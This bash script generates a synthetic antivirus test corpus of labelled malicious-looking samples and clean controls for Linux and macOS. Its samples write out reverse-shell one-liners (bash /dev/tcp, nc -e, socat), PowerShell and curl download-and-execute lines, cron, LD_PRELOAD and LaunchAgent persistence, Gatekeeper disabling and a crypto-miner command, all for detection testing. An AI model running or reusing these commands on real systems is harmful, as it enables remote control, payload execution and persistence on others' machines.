#!/usr/bin/env bash
# Generate a SAFE, synthetic test corpus covering Linux and macOS.
#
# Nothing here is live malware. Every sample is either the industry-standard
# EICAR string or bytes constructed to exercise one specific detection layer.
# They are intentionally inert: no executable code path ever runs.
set -euo pipefail

out="${1:-/tmp/auraav-corpus}"
mkdir -p "$out"
rm -f "$out"/*

##############################################################################
# Cross-platform / generic
##############################################################################

# Malicious (expected: Malicious) — exact hash + rule match
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  > "$out/eicar.com"

# L2 rule: reverse shell (>= 2 of the rule's patterns)
cat > "$out/reverse_shell.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
RHOST=203.0.113.7
RPORT=4444
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
EOF

# L2 rules + L9 script heuristics: obfuscated PowerShell
cat > "$out/encoded.ps1" <<'EOF'
# synthetic test sample - never executed
$ErrorActionPreference = "SilentlyContinue"
$p = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA"
[System.Convert]::FromBase64String($p) | Out-Null
IEX(New-Object Net.WebClient).DownloadString("http://198.51.100.9/a")
EOF

# L2 rule: download-and-execute (>= 3 of the rule's patterns)
cat > "$out/downloader.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
curl http://198.51.100.9/payload -o /tmp/p
chmod +x /tmp/p
/tmp/p | sh
EOF

# L2 rule: ransomware note indicators
cat > "$out/ransomware_note.txt" <<'EOF'
All your files have been encrypted.
To recover them, send bitcoin to the address below.
EOF

# L2 rule (Yara-only, capped at Suspicious): credential-theft tool markers
head -c 8192 /dev/urandom > "$out/meterpreter.bin"
printf 'meterpreter' >> "$out/meterpreter.bin"
head -c 4096 /dev/urandom >> "$out/meterpreter.bin"

# L9 heuristic: UPX-packed unknown binary (markers + high entropy)
head -c 4096 /dev/urandom > "$out/packed.bin"
printf 'UPX0' >> "$out/packed.bin"
head -c 100 /dev/urandom >> "$out/packed.bin"
printf 'UPX1' >> "$out/packed.bin"
head -c 4096 /dev/urandom >> "$out/packed.bin"

# L9 heuristic: valid PE embedded past offset 0 (dropper / self-extractor)
{
  printf 'A%.0s' $(seq 1 64)
  printf 'MZ'
  head -c 58 /dev/zero
  printf '\x40\x00\x00\x00'
  printf 'PE\x00\x00'
  head -c 3900 /dev/zero
} > "$out/dropper.bin"

# L9 heuristic: very high overall entropy (unknown binary)
head -c 8192 /dev/urandom > "$out/high_entropy.bin"

##############################################################################
# Linux
##############################################################################

# L2 rule: socat/nc reverse shell (>= 2 patterns)
cat > "$out/linux_reverse_shell.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
(socat exec:'bash -li',pty,stderr,setsid,sigint,sane) &
nc -e /bin/bash 203.0.113.9 4444
EOF

# L2 rule: crypto-miner indicators (>= 2 patterns)
cat > "$out/crypto_miner.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
./xmrig --donate-level 1 -o stratum+tcp://pool.example.invalid:3333 -u wallet
EOF

# L2 rule: persistence indicators (>= 2 patterns)
cat > "$out/linux_persistence.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
echo '@reboot root /tmp/.hidden/a' >> /etc/cron.d/system-update
echo 'LD_PRELOAD=/tmp/.hidden/lib.so' >> /etc/environment
EOF

# Minimal, syntactically valid ELF64 header (no code) -> clean control
{
  printf '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
  printf '\x02\x00\x00\x00'                       # e_type = ET_EXEC
  printf '\x3e\x00'                               # e_machine = x86-64
  printf '\x01\x00\x00\x00'                       # e_version
  printf '\x00\x00\x00\x00\x00\x00\x00\x00'       # e_entry
  printf '\x00\x00\x00\x00\x00\x00\x00\x00'       # e_phoff
  printf '\x00\x00\x00\x00\x00\x00\x00\x00'       # e_shoff
  printf '\x00\x00\x00\x00'                       # e_flags
  printf '\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # ehsize/phentsize/phnum/shentsize/shnum/shstrndx
} > "$out/elf_clean.bin"

# Same ELF header + UPX markers -> suspicious (heuristic on ELF)
cp "$out/elf_clean.bin" "$out/elf_upx.bin"
head -c 4096 /dev/urandom >> "$out/elf_upx.bin"
printf 'UPX0' >> "$out/elf_upx.bin"
head -c 64 /dev/urandom >> "$out/elf_upx.bin"
printf 'UPX1' >> "$out/elf_upx.bin"

##############################################################################
# macOS
##############################################################################

# L2 rule: LaunchAgent/LaunchDaemon persistence (>= 3 patterns)
cat > "$out/com.evil.agent.plist" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!-- synthetic test sample - never installed -->
<plist version="1.0">
<dict>
  <key>Label</key><string>com.evil.agent</string>
  <key>ProgramArguments</key><array><string>/tmp/.hidden/a</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>
EOF

# L2 rule: JXA downloader (>= 3 patterns)
cat > "$out/macos_dropper.js" <<'EOF'
// synthetic test sample - never executed
ObjC.import('Foundation');
ObjC.import('AppKit');
var url = $.NSURL.URLWithString('http://198.51.100.9/payload');
var data = $.NSData.dataWithContentsOfURL(url);
data.writeToFile('/tmp/.hidden/a');
var task = $.NSTask.alloc.init;
EOF

# L2 rule: Gatekeeper quarantine bypass (>= 2 patterns)
cat > "$out/macos_gatekeeper.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
xattr -d com.apple.quarantine /Applications/Evil.app
spctl --master-disable
EOF

# L2 rule: macOS shell reverse shell (>= 2 patterns)
cat > "$out/macos_reverse_shell.sh" <<'EOF'
#!/bin/bash
# synthetic test sample - never executed
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
EOF

# Minimal Mach-O 64 header (no load commands) -> clean control
{
  printf '\xcf\xfa\xed\xfe'          # MH_MAGIC_64
  printf '\x07\x00\x00\x01'          # CPU_TYPE_X86_64
  printf '\x03\x00\x00\x00'          # CPU_SUBTYPE_X86_64_ALL
  printf '\x02\x00\x00\x00'          # MH_EXECUTE
  printf '\x00\x00\x00\x00'          # ncmds
  printf '\x00\x00\x00\x00'          # sizeofcmds
  printf '\x00\x00\x00\x00'          # flags
  printf '\x00\x00\x00\x00'          # reserved
} > "$out/macho_clean.bin"

# Same Mach-O header + UPX markers -> suspicious (heuristic on Mach-O)
cp "$out/macho_clean.bin" "$out/macho_upx.bin"
head -c 4096 /dev/urandom >> "$out/macho_upx.bin"
printf 'UPX0' >> "$out/macho_upx.bin"
head -c 64 /dev/urandom >> "$out/macho_upx.bin"
printf 'UPX1' >> "$out/macho_upx.bin"

##############################################################################
# Clean controls — these MUST NOT be flagged
##############################################################################
printf 'The quick brown fox jumps over the lazy dog.\n' > "$out/clean.txt"

cat > "$out/clean.sh" <<'EOF'
#!/bin/bash
set -euo pipefail
echo "hello from a perfectly ordinary script"
EOF

cat > "$out/clean.py" <<'EOF'
def main():
    print("hello, world")

if __name__ == "__main__":
    main()
EOF

printf 'console.log("hello, world");\n' > "$out/clean.js"

echo "generated corpus in $out"
ls -l "$out"
